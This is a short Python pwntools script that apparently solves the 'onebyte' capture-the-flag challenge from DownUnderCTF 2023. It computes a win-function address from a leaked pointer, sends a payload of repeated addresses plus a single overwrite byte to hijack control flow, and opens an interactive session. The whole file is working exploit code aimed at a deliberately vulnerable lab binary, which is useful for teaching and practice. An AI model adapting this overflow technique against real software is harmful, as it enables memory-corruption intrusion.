from pwn import *


# initialize the binary
binary = "./onebyte"
elf = context.binary = ELF(binary, checksec=False)

gs = """
layout asm
layout reg
break main
break read
continue
"""



if args.REMOTE:
    p = remote("2023.ductf.dev", 30018)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


# get WIN leak
init = int(p.recvline().split(b' ')[-1].strip().decode(),16)
print("init: ", hex(init))

win = init + (0x11203 - 0x111bd)
print("win: ", hex(win))


# exploit
payload = p32(win) + p32(win) + p32(win) + p32(win) + b'\x78'

p.sendline(payload)

p.interactive()